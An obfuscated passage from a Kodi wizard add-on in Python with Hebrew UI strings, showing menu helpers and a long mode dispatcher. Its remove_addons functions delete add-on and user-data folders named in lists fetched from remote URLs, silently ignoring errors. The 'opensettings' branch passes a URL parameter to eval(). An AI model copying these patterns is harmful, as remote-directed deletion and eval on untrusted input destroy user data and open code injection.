	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5622
def wait ():#line:5623
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:5624
def infobuild ():#line:5625
	OOO0OOOOO00000O00 =wiz .workingURL (NOTIFICATION )#line:5626
	if OOO0OOOOO00000O00 ==True :#line:5627
		try :#line:5628
			OOOO0O0000O0OO00O ,OO0O0OO0000O00OOO =wiz .splitNotify (NOTIFICATION )#line:5629
			if OOOO0O0000O0OO00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5630
			if STARTP2 ()=='ok':#line:5631
				notify .updateinfo (OO0O0OO0000O00OOO ,True )#line:5632
		except Exception as OOO00O000OOO0OOO0 :#line:5633
			wiz .log ("Error on Notifications Window: %s"%str (OOO00O000OOO0OOO0 ),xbmc .LOGERROR )#line:5634
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5635
def servicemanual ():#line:5636
	OOOO0OOOO0000OOO0 =wiz .workingURL (HELPINFO )#line:5637
	if OOOO0OOOO0000OOO0 ==True :#line:5638
		try :#line:5639
			O0OOO00OO00OOO0OO ,O0O0OOO00000OOO0O =wiz .splitNotify (HELPINFO )#line:5640
			if O0OOO00OO00OOO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5641
			notify .helpinfo (O0O0OOO00000OOO0O ,True )#line:5642
		except Exception as OO0O00OOOOOO00O00 :#line:5643
			wiz .log ("Error on Notifications Window: %s"%str (OO0O00OOOOOO00O00 ),xbmc .LOGERROR )#line:5644
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5645
def testupdate ():#line:5647
	if BUILDNAME =="":#line:5648
		notify .updateWindow ()#line:5649
	else :#line:5650
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5651
def testfirst ():#line:5653
	notify .firstRun ()#line:5654
def testfirstRun ():#line:5656
	notify .firstRunSettings ()#line:5657
def fastinstall ():#line:5660
	notify .firstRuninstall ()#line:5661
def addDir (OOOO00O0OO00000O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5668
	O0O00OOO0OO000O0O =sys .argv [0 ]#line:5669
	if not mode ==None :O0O00OOO0OO000O0O +="?mode=%s"%urllib .quote_plus (mode )#line:5670
	if not name ==None :O0O00OOO0OO000O0O +="&name="+urllib .quote_plus (name )#line:5671
	if not url ==None :O0O00OOO0OO000O0O +="&url="+urllib .quote_plus (url )#line:5672
	O0OO0OO0OOO00O000 =True #line:5673
	if themeit :OOOO00O0OO00000O0 =themeit %OOOO00O0OO00000O0 #line:5674
	O0000O000O000OO0O =xbmcgui .ListItem (OOOO00O0OO00000O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5675
	O0000O000O000OO0O .setInfo (type ="Video",infoLabels ={"Title":OOOO00O0OO00000O0 ,"Plot":description })#line:5676
	O0000O000O000OO0O .setProperty ("Fanart_Image",fanart )#line:5677
	if not menu ==None :O0000O000O000OO0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5678
	O0OO0OO0OOO00O000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O00OOO0OO000O0O ,listitem =O0000O000O000OO0O ,isFolder =True )#line:5679
	return O0OO0OO0OOO00O000 #line:5680
def addFile (OO00000O0O0O0OOO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5682
	O000OOO000O00OO0O =sys .argv [0 ]#line:5683
	if not mode ==None :O000OOO000O00OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5684
	if not name ==None :O000OOO000O00OO0O +="&name="+urllib .quote_plus (name )#line:5685
	if not url ==None :O000OOO000O00OO0O +="&url="+urllib .quote_plus (url )#line:5686
	OOO000O0OOOOOOO0O =True #line:5687
	if themeit :OO00000O0O0O0OOO0 =themeit %OO00000O0O0O0OOO0 #line:5688
	O0O000OO0O0000OOO =xbmcgui .ListItem (OO00000O0O0O0OOO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5689
	O0O000OO0O0000OOO .setInfo (type ="Video",infoLabels ={"Title":OO00000O0O0O0OOO0 ,"Plot":description })#line:5690
	O0O000OO0O0000OOO .setProperty ("Fanart_Image",fanart )#line:5691
	if not menu ==None :O0O000OO0O0000OOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5692
	OOO000O0OOOOOOO0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000OOO000O00OO0O ,listitem =O0O000OO0O0000OOO ,isFolder =False )#line:5693
	return OOO000O0OOOOOOO0O #line:5694
def get_params ():#line:5696
	O00000O0OO0OOOO0O =[]#line:5697
	O00OO000000000OOO =sys .argv [2 ]#line:5698
	if len (O00OO000000000OOO )>=2 :#line:5699
		OO000OO0OOO0O0OOO =sys .argv [2 ]#line:5700
		OOO00O0OO0000OOOO =OO000OO0OOO0O0OOO .replace ('?','')#line:5701
		if (OO000OO0OOO0O0OOO [len (OO000OO0OOO0O0OOO )-1 ]=='/'):#line:5702
			OO000OO0OOO0O0OOO =OO000OO0OOO0O0OOO [0 :len (OO000OO0OOO0O0OOO )-2 ]#line:5703
		O0O000OOO0OOO00O0 =OOO00O0OO0000OOOO .split ('&')#line:5704
		O00000O0OO0OOOO0O ={}#line:5705
		for O0O0000OO00OO0OO0 in range (len (O0O000OOO0OOO00O0 )):#line:5706
			OOOOO0OOOOOO0O000 ={}#line:5707
			OOOOO0OOOOOO0O000 =O0O000OOO0OOO00O0 [O0O0000OO00OO0OO0 ].split ('=')#line:5708
			if (len (OOOOO0OOOOOO0O000 ))==2 :#line:5709
				O00000O0OO0OOOO0O [OOOOO0OOOOOO0O000 [0 ]]=OOOOO0OOOOOO0O000 [1 ]#line:5710
		return O00000O0OO0OOOO0O #line:5712
def remove_addons ():#line:5714
	try :#line:5715
			import json #line:5716
			O000OO0O0OO00OO0O =urllib2 .urlopen (remove_url ).readlines ()#line:5717
			for O0O000O00O0O00OO0 in O000OO0O0OO00OO0O :#line:5718
				O00O00O00O000OO0O =O0O000O00O0O00OO0 .split (':')[1 ].strip ()#line:5720
				OO00000OO0O00OO0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O00O00O00O000OO0O ,'false')#line:5721
				O0O00OOO000OOOO00 =xbmc .executeJSONRPC (OO00000OO0O00OO0O )#line:5722
				OO00O00O0OO0O00O0 =json .loads (O0O00OOO000OOOO00 )#line:5723
				OO0000OO00O0000OO =os .path .join (addons_folder ,O00O00O00O000OO0O )#line:5725
				if os .path .exists (OO0000OO00O0000OO ):#line:5727
					for O0O000OO00OO00OOO ,OOOOOOOOO0O000OOO ,OO0OO0O0O0000000O in os .walk (OO0000OO00O0000OO ):#line:5728
						for O0O0O0O0000OOO000 in OO0OO0O0O0000000O :#line:5729
							os .unlink (os .path .join (O0O000OO00OO00OOO ,O0O0O0O0000OOO000 ))#line:5730
						for OOO00O0OOO0O0OO0O in OOOOOOOOO0O000OOO :#line:5731
							shutil .rmtree (os .path .join (O0O000OO00OO00OOO ,OOO00O0OOO0O0OO0O ))#line:5732
					os .rmdir (OO0000OO00O0000OO )#line:5733
			xbmc .executebuiltin ('Container.Refresh')#line:5735
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5736
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5737
	except :pass #line:5738
def remove_addons2 ():#line:5739
	try :#line:5740
			import json #line:5741
			O0OOOOOOOOOO000O0 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5742
			for OO000OOO00OOOO0O0 in O0OOOOOOOOOO000O0 :#line:5743
				OO0OOO000O0OOO0OO =OO000OOO00OOOO0O0 .split (':')[1 ].strip ()#line:5745
				OOOOO00O000O0000O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO0OOO000O0OOO0OO ,'false')#line:5746
				OO0O0OO0OO000O0O0 =xbmc .executeJSONRPC (OOOOO00O000O0000O )#line:5747
				OOO0OO000O00O0OO0 =json .loads (OO0O0OO0OO000O0O0 )#line:5748
				O0000OOO0OO000OOO =os .path .join (user_folder ,OO0OOO000O0OOO0OO )#line:5750
				if os .path .exists (O0000OOO0OO000OOO ):#line:5752
					for O00OO00O0OOO00O0O ,OO0OO0O00O000OOO0 ,OOO0000OOO0O0O00O in os .walk (O0000OOO0OO000OOO ):#line:5753
						for OOO0OOOO00OOOO000 in OOO0000OOO0O0O00O :#line:5754
							os .unlink (os .path .join (O00OO00O0OOO00O0O ,OOO0OOOO00OOOO000 ))#line:5755
						for OOOOOO00OO0O0OOO0 in OO0OO0O00O000OOO0 :#line:5756
							shutil .rmtree (os .path .join (O00OO00O0OOO00O0O ,OOOOOO00OO0O0OOO0 ))#line:5757
					os .rmdir (O0000OOO0OO000OOO )#line:5758
	except :pass #line:5760
params =get_params ()#line:5761
url =None #line:5762
name =None #line:5763
mode =None #line:5764
try :mode =urllib .unquote_plus (params ["mode"])#line:5766
except :pass #line:5767
try :name =urllib .unquote_plus (params ["name"])#line:5768
except :pass #line:5769
try :url =urllib .unquote_plus (params ["url"])#line:5770
except :pass #line:5771
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5773
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5774
def setView (OOO0O0000O00OOO0O ,O000OOOOO00O0O0O0 ):#line:5775
	if wiz .getS ('auto-view')=='true':#line:5776
		O00O00000O0O0O0OO =wiz .getS (O000OOOOO00O0O0O0 )#line:5777
		if O00O00000O0O0O0OO =='50'and KODIV >=17 and SKIN =='skin.estuary':O00O00000O0O0O0OO ='55'#line:5778
		if O00O00000O0O0O0OO =='500'and KODIV >=17 and SKIN =='skin.estuary':O00O00000O0O0O0OO ='50'#line:5779
		wiz .ebi ("Container.SetViewMode(%s)"%O00O00000O0O0O0OO )#line:5780
if mode ==None :index ()#line:5782
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5784
elif mode =='builds':buildMenu ()#line:5785
elif mode =='viewbuild':viewBuild (name )#line:5786
elif mode =='buildinfo':buildInfo (name )#line:5787
elif mode =='buildpreview':buildVideo (name )#line:5788
elif mode =='install':buildWizard (name ,url )#line:5789
elif mode =='theme':buildWizard (name ,mode ,url )#line:5790
elif mode =='viewthirdparty':viewThirdList (name )#line:5791
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5792
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5793
elif mode =='maint':maintMenu (name )#line:5795
elif mode =='passpin':passandpin ()#line:5796
elif mode =='backmyupbuild':backmyupbuild ()#line:5797
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5798
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5799
elif mode =='advancedsetting':advancedWindow (name )#line:5800
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5801
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5802
elif mode =='asciicheck':wiz .asciiCheck ()#line:5803
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5804
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5805
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5806
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5807
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5808
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5809
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5810
elif mode =='currentsettings':viewAdvanced ()#line:5811
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5812
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5813
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5814
elif mode =='fixskin':backtokodi ()#line:5815
elif mode =='testcommand':testcommand ()#line:5816
elif mode =='logsend':logsend ()#line:5817
elif mode =='rdon':rdon ()#line:5818
elif mode =='rdoff':rdoff ()#line:5819
elif mode =='setrd':setrealdebrid ()#line:5820
elif mode =='setrd2':setautorealdebrid ()#line:5821
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5822
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5823
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5824
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5825
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5826
elif mode =='freshstart':freshStart ()#line:5827
elif mode =='forceupdate':wiz .forceUpdate ()#line:5828
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5829
elif mode =='forceclose':wiz .killxbmc ()#line:5830
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5831
elif mode =='hidepassword':wiz .hidePassword ()#line:5832
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5833
elif mode =='enableaddons':enableAddons ()#line:5834
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5835
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5836
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5837
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5838
elif mode =='uploadlog':uploadLog .Main ()#line:5839
elif mode =='viewlog':LogViewer ()#line:5840
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5841
elif mode =='viewerrorlog':errorChecking (all =True )#line:5842
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5843
elif mode =='purgedb':purgeDb ()#line:5844
elif mode =='fixaddonupdate':fixUpdate ()#line:5845
elif mode =='removeaddons':removeAddonMenu ()#line:5846
elif mode =='removeaddon':removeAddon (name )#line:5847
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5848
elif mode =='removedata':removeAddonData (name )#line:5849
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5850
elif mode =='systeminfo':systemInfo ()#line:5851
elif mode =='restorezip':restoreit ('build')#line:5852
elif mode =='restoregui':restoreit ('gui')#line:5853
elif mode =='restoreaddon':restoreit ('addondata')#line:5854
elif mode =='restoreextzip':restoreextit ('build')#line:5855
elif mode =='restoreextgui':restoreextit ('gui')#line:5856
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5857
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5858
elif mode =='traktsync':traktsync ()#line:5859
elif mode =='apk':apkMenu (name )#line:5861
elif mode =='apkscrape':apkScraper (name )#line:5862
elif mode =='apkinstall':apkInstaller (name ,url )#line:5863
elif mode =='speed':speedMenu ()#line:5864
elif mode =='net':net_tools ()#line:5865
elif mode =='GetList':GetList (url )#line:5866
elif mode =='youtube':youtubeMenu (name )#line:5867
elif mode =='viewVideo':playVideo (url )#line:5868
elif mode =='addons':addonMenu (name )#line:5870
elif mode =='addoninstall':addonInstaller (name ,url )#line:5871
elif mode =='savedata':saveMenu ()#line:5873
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5874
elif mode =='managedata':manageSaveData (name )#line:5875
elif mode =='whitelist':wiz .whiteList (name )#line:5876
elif mode =='trakt':traktMenu ()#line:5878
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5879
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5880
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5881
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5882
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5883
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5884
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5885
elif mode =='realdebrid':realMenu ()#line:5887
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5888
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5889
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5890
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5891
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5892
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5893
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5894
elif mode =='login':loginMenu ()#line:5896
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5897
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5898
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5899
elif mode =='clearlogin':loginit .clearSaved (name )#line:5900
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5901
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5902
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5903
elif mode =='contact':notify .contact (CONTACT )#line:5905
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5906
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5907
elif mode =='developer':developer ()#line:5909
elif mode =='converttext':wiz .convertText ()#line:5910
elif mode =='createqr':wiz .createQR ()#line:5911
elif mode =='testnotify':testnotify ()#line:5912
elif mode =='testnotify2':testnotify2 ()#line:5913
elif mode =='servicemanual':servicemanual ()#line:5914
elif mode =='fastinstall':fastinstall ()#line:5915
elif mode =='testupdate':testupdate ()#line:5916
elif mode =='testfirst':testfirst ()#line:5917
elif mode =='testfirstrun':testfirstRun ()#line:5918
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5919
elif mode =='bg':wiz .bg_install (name ,url )#line:5921
elif mode =='bgcustom':wiz .bg_custom ()#line:5922
elif mode =='bgremove':wiz .bg_remove ()#line:5923
elif mode =='bgdefault':wiz .bg_default ()#line:5924
elif mode =='rdset':rdsetup ()#line:5925
elif mode =='mor':morsetup ()#line:5926
elif mode =='mor2':morsetup2 ()#line:5927
elif mode =='resolveurl':resolveurlsetup ()#line:5928
elif mode =='urlresolver':urlresolversetup ()#line:5929
elif mode =='forcefastupdate':forcefastupdate ()#line:5930
elif mode =='traktset':traktsetup ()#line:5931
elif mode =='placentaset':placentasetup ()#line:5932
elif mode =='flixnetset':flixnetsetup ()#line:5933
elif mode =='reptiliaset':reptiliasetup ()#line:5934
elif mode =='yodasset':yodasetup ()#line:5935
elif mode =='numbersset':numberssetup ()#line:5936
elif mode =='uranusset':uranussetup ()#line:5937
elif mode =='genesisset':genesissetup ()#line:5938
elif mode =='fastupdate':fastupdate ()#line:5939
elif mode =='folderback':folderback ()#line:5940
elif mode =='menudata':Menu ()#line:5941
elif mode =='infoupdate':infobuild ()#line:5942
elif mode =='wait':wait ()#line:5943
elif mode ==2 :#line:5944
        wiz .torent_menu ()#line:5945
elif mode ==3 :#line:5946
        wiz .popcorn_menu ()#line:5947
elif mode ==8 :#line:5948
        wiz .metaliq_fix ()#line:5949
elif mode ==9 :#line:5950
        wiz .quasar_menu ()#line:5951
elif mode ==5 :#line:5952
        swapSkins ('skin.Premium.mod')#line:5953
elif mode ==13 :#line:5954
        wiz .elementum_menu ()#line:5955
elif mode ==16 :#line:5956
        wiz .fix_wizard ()#line:5957
elif mode ==17 :#line:5958
        wiz .last_play ()#line:5959
elif mode ==18 :#line:5960
        wiz .normal_metalliq ()#line:5961
elif mode ==19 :#line:5962
        wiz .fast_metalliq ()#line:5963
elif mode ==20 :#line:5964
        wiz .fix_buffer2 ()#line:5965
elif mode ==21 :#line:5966
        wiz .fix_buffer3 ()#line:5967
elif mode ==11 :#line:5968
        wiz .fix_buffer ()#line:5969
elif mode ==15 :#line:5970
        wiz .fix_font ()#line:5971
elif mode ==14 :#line:5972
        wiz .clean_pass ()#line:5973
elif mode ==22 :#line:5974
        wiz .movie_update ()#line:5975
elif mode =='update_tele':updatetelemedia (NOTEID )#line:5977
elif mode =='adv_settings':buffer1 ()#line:5978
elif mode =='getpass':getpass ()#line:5979
elif mode =='setpass':setpass ()#line:5980
elif mode =='setuname':setuname ()#line:5981
elif mode =='passandUsername':passandUsername ()#line:5982
elif mode =='9':disply_hwr ()#line:5983
elif mode =='99':disply_hwr2 ()#line:5984
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))